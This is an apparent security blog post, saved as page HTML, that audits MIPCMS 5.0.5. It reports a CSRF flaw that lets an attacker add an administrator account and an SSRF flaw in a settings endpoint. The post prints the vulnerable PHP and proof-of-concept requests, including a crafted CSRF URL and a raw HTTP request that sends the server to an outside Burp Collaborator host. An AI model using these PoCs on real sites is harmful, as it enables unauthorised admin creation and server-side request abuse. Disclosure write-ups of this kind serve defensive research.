@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="mipcms code audit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php-mipcms">
+<meta property="og:url" content="http://www.lxhsec.com/2020/02/03/php-mipcms/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="mipcms code audit">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-csrf-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-csrf-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-csrf-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-ssrf-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-ssrf-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-ssrf-03.png">
+<meta property="og:updated_time" content="2020-02-03T12:56:05.446Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php-mipcms">
+<meta name="twitter:description" content="mipcms code audit">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/02/03/php-mipcms/mipcms-csrf-01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/02/03/php-mipcms/"/>
+
+
+
+
+
+  <title>php-mipcms | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/02/03/php-mipcms/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php-mipcms</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T17:17:49+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-02-03T20:56:05+08:00">
+                2020-02-03
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>mipcms code audit<a id="more"></a></p>
+<h1 id="MIPCMS"><a href="#MIPCMS" class="headerlink" title="MIPCMS"></a>MIPCMS</h1><p>MIP website building system is a set of free open source CMS building system, mobile website using MIP standard web pages, can quickly let your website baidu included, MIPCMS all pages are after SEO optimization, webmaster can set up in a short time with PC version and mobile version of baidu MIP website, without SEO optimization</p>
+<p>official site：<a href="http://www.mipcms.com/" target="_blank" rel="external">http://www.mipcms.com/</a></p>
+<p>Installation package download：<a href="https://mipclouds.oss-cn-beijing.aliyuncs.com/code/mipjz/mipjz-5.0.5.zip" target="_blank" rel="external">https://mipclouds.oss-cn-beijing.aliyuncs.com/code/mipjz/mipjz-5.0.5.zip</a></p>
+<p>version: v5.0.5</p>
+<p>hosts:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127.0.0.1 www.mip.com</div></pre></td></tr></table></figure></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>Vulnerability code in：<br><code>mipjz/app/user/controller/ApiAdminUser.php</code></p>
+<p>itemAdd function，Without token protection, CSRF can add admin account.<br><img src="/2020/02/03/php-mipcms/mipcms-csrf-01.png" alt="mipcms-csrf-01"></p>
+<p>itemAdd function complete code:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">itemAdd</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $data = <span class="keyword">$this</span>-&gt;request-&gt;post();</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'username'</span>]) || !$data[<span class="string">'username'</span>]) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'请输入用户名'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (strlen($data[<span class="string">'username'</span>]) &gt; <span class="number">24</span> || strlen($data[<span class="string">'username'</span>]) &lt; <span class="number">2</span>) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'用户名长度不合法'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'password'</span>]) || !$data[<span class="string">'password'</span>]) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'请输入密码'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'rpassword'</span>]) || !$data[<span class="string">'rpassword'</span>]) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'请重复输入密码'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($data[<span class="string">'password'</span>] == <span class="string">'d41d8cd98f00b204e9800998ecf8427e'</span>) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'请输入密码'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($data[<span class="string">'rpassword'</span>] == <span class="string">'d41d8cd98f00b204e9800998ecf8427e'</span>) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'请重复输入密码'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> ($data[<span class="string">'password'</span>] != $data[<span class="string">'rpassword'</span>]) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'两次输入的密码必须相同'</span>);</div><div class="line">        &#125;</div><div class="line">        $itemInfo = db(<span class="keyword">$this</span>-&gt;item)-&gt;where(<span class="string">'username'</span>,$data[<span class="string">'username'</span>])-&gt;find();</div><div class="line">        <span class="keyword">if</span> ($itemInfo) &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'用户已存在'</span>);</div><div class="line">        &#125;</div><div class="line">        $uuid = uuid();</div><div class="line">        $salt = create_salt(<span class="number">8</span>);</div><div class="line">        $resArray = <span class="keyword">array</span> (</div><div class="line">            <span class="string">'uid'</span> =&gt; $uuid,</div><div class="line">            <span class="string">'username'</span> =&gt; $data[<span class="string">'username'</span>],</div><div class="line">            <span class="string">'password'</span> =&gt; create_md5($data[<span class="string">'password'</span>],$salt),</div><div class="line">            <span class="string">'salt'</span> =&gt; $salt,</div><div class="line">            <span class="string">'reg_time'</span> =&gt; time(),</div><div class="line">            <span class="string">'reg_ip'</span> =&gt; Request::instance()-&gt;ip(),</div><div class="line">            <span class="string">'email'</span> =&gt; $data[<span class="string">'email'</span>],</div><div class="line">            <span class="string">'group_id'</span> =&gt; $data[<span class="string">'groupId'</span>],</div><div class="line">            <span class="string">'mobile'</span> =&gt; $data[<span class="string">'mobile'</span>],</div><div class="line">            <span class="string">'rank'</span> =&gt; <span class="number">1</span>,</div><div class="line">            <span class="string">'terminal'</span> =&gt; (<span class="keyword">isset</span>($data[<span class="string">'terminal'</span>]) &amp;&amp; $data[<span class="string">'terminal'</span>]) ? $data[<span class="string">'terminal'</span>] : <span class="string">'pc'</span>,</div><div class="line">        );</div><div class="line">        <span class="keyword">if</span> (db(<span class="keyword">$this</span>-&gt;item)-&gt;insert($resArray)) &#123;</div><div class="line">            <span class="keyword">return</span> jsonSuccess(<span class="string">'添加成功'</span>); <span class="comment">// add admin count.</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> jsonError(<span class="string">'添加失败'</span>);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>Use project <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="external">https://github.com/sp1d3r/swf_json_csrf</a>,<br>After the administrator logged in, open poc.<br>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/swf_json_csrf/read.html?jsonData=&#123;%22groupId%22:1,%22username%22:%22testadmin666%22,%22password%22:%22098f6bcd4621d373cade4e832627b4f6%22,%22rpassword%22:%22098f6bcd4621d373cade4e832627b4f6%22&#125;&amp;php_url=http://127.0.0.1/swf_json_csrf/test.php&amp;endpoint=http://www.mip.com/index.php?s=/user/ApiAdminUser/itemAdd&amp;ct=application/json</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/03/php-mipcms/mipcms-csrf-02.png" alt="mipcms-csrf-02"></p>
+<p><img src="/2020/02/03/php-mipcms/mipcms-csrf-03.png" alt="mipcms-csrf-03"></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Vulnerability code in：<br><code>mipjz/app/setting/controller/ApiAdminDomainSettings.php</code></p>
+<p>urlPost function，$postAddress value is not filtered, lead to SSRF.<br><img src="/2020/02/03/php-mipcms/mipcms-ssrf-01.png" alt="mipcms-ssrf-01"></p>
+<p><img src="/2020/02/03/php-mipcms/mipcms-ssrf-02.png" alt="mipcms-ssrf-02"></p>
+<p>After the administrator logged in, request poc.</p>
+<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">POST /index.php/setting/ApiAdminDomainSettings/urlPost HTTP/1.1</div><div class="line">Host: www.mip.com</div><div class="line">Content-Length: 76</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://www.mip.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</div><div class="line">Referer: http://www.mip.com/index.php/setting/ApiAdminDomainSettings/urlPost</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9</div><div class="line">Cookie: PHPSESSID=7h9kfl5b0r8gqj6osls3li31j2 </div><div class="line">Connection: close</div><div class="line"></div><div class="line">postAddress=http://rrmbi6siwk72es31u9gykpe6hxnnbc.burpcollaborator.net&amp;url=1</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/02/03/php-mipcms/mipcms-ssrf-03.png" alt="mipcms-ssrf-03"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>穷困潦倒的安全工作者，如果文章对您有所帮助，可以选择性打赏。</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/WeChatQR.JPG" alt="lyxhh 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2020/02/03/php-mipcms/" title="php-mipcms">http://www.lxhsec.com/2020/02/03/php-mipcms/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/01/php-code-audit/" rel="next" title="php-ZhiCms">
+                <i class="fa fa-chevron-left"></i> php-ZhiCms
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MIPCMS"><span class="nav-number">1.</span> <span class="nav-text">MIPCMS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">1.1.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">1.2.</span> <span class="nav-text">SSRF</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+  
+</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
